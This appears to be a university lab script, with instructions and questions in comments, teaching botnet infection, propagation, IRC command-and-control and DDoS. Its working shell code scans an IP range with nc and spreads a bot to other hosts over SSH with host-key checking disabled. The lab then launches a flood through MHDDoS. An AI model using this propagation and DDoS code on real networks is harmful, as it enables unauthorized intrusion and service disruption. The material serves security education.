# [DISCLAIMER]

# Do not use any of the code in this lab to do anything stupid
# (definitely do not target real domains), you will get caught!

# This code was created without any security or protection in mind
# and many things are simplified to demonstrate the concept of botnets
# for the purposes of the lab.

# When you are finished with the lab, please clean up after yourselves and
# run "./kill_botnet.sh 4 120 <utorid>" :)


# [OVERVIEW]

# This will be an interactive lab.
# Make sure to read all instructions carefully.
# Wherever there is an ANSWER or TODO, you must complete them to get full marks.

# In this lab, we will be exploring 4 of the 5 phases of the botnet lifecycle:
# Infection -> Propagation -> Connection -> Control

# We will not be covering Maintainence & Upgrading.


# [REQUIREMENTS]

# Run "chmod u+x c2.py bot.py botnet.sh kill_botnet.sh" to add execute permissions.

# Run "pip install -r requirements.txt" inside the "MHDDoS" directory.

# [RUNNING IRC SERVER]

# Run "ifconfig" and make a note of the ipv4 address of the eno1 network interface.
# This will be the ip address that the IRC server will run on and that
# our botmaster and bots will connect to.

# Edit the "ergo-2.13.0-linux-x86_64/ircd.yaml" file.
# Under "server -> listeners", replace 127.0.0.1 with the address you found.

# Navigate to the "ergo-2.13.0-linux-x86_64" directory and run "./ergo run" to start the server.

# QUESTION: What is the standard plaintext port that our bots use to connect to the IRC server?
# ANSWER: 


# [JOINING IRC SERVER AS BOTMASTER]

# In a separate terminal, run "./c2.py <irc_server_ip>" to join the IRC server as the botmaster.


# [RECONNAISSANCE]

# In a separate terminal:

# Run "ssh dh2026pc01" and then "ifconfig".

# QUESTION: What is the ipv4 address (inet) of the eno1 network interface?
# ANSWER: 

# Run "ssh dh2010pc00" and then "ifconfig".

# QUESTION: What is the ipv4 address (inet) of the eno1 network interface?
# ANSWER: 

# Run "ssh <ip_address>" on a few other ip addresses, where <ip_address> is
# some ip address in between the ip range of the previous two answers.

# QUESTION: What can you infer about this ip range?
# ANSWER: 

# Make a note of the endings (last byte) of these two ip addresses.
# You will pass them as arguments when you call this script later.


# [INFECTION -> PROPAGATION -> CONNECTION]

# TODO: Replace this with the ip address of the lab pc
# you wish to run the IRC server on.
irc_server="142.1.46.4"

script_dir=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

ip_prefix="142.1.46."
range_start=$1
range_end=$2

i=$range_start

# Iterate over ip range to find new hosts to infect.
while [ $i -le $range_end ]; do
    echo "$i, $range_end"

    ip_address="$ip_prefix$i"

    nc -zv -w 1 $ip_address ssh
    if [ $? -eq 0 ]; then
        # SSH port was open. Infect the host.

        # Divide and conquer:
        # Assign a partition of the ip range to the new bot.
        right_range_end=$range_end
        left_range_end=$(( i + ((range_end - i) / 2) ))
        right_range_start=$(( left_range_end + 1 ))

        # Normally, this is when we attempt to gain unauthorized access to each victim machine,
        # however, since we are already logged in as a user, we can ssh into the other machines
        # for free without having to provide a password. This is also where we introduce our
        # botnet files into each victim machine, however, this is already taken care of by NFS.

        # Infect host and use it to recursively infect more victims.
        # TODO: Replace <> and <> with the scripts that we want to execute on the victim lab pc.
        ssh -o "StrictHostKeyChecking no" $ip_address "cd $script_dir; ./bot.py $irc_server & ./botnet.sh $right_range_start $right_range_end &" &

        range_end=$left_range_end
    fi

    (( ++i ))
done

# After you have completed all of the previous steps, in a separate terminal,
# call "./botnet.sh <range_start> <range_end>" with the appropriate arguments
# to begin infecting the lab pcs.


# [CONTROL]

# Run the command "NAMES #botnet" in the botmaster IRC client.

# QUESTION: What does this command do?
# ANSWER: 

# In a separate terminal, run the command "python3 -m http.server -b <ip_address> 8080"
# to start the victim server (run "ifconfig" if you don't remember).

# Send the command "DDOS TCP <target_ip> <target_port> 8 10" from the botmaster IRC client.

# QUESTION: What does this command do?
# ANSWER: 
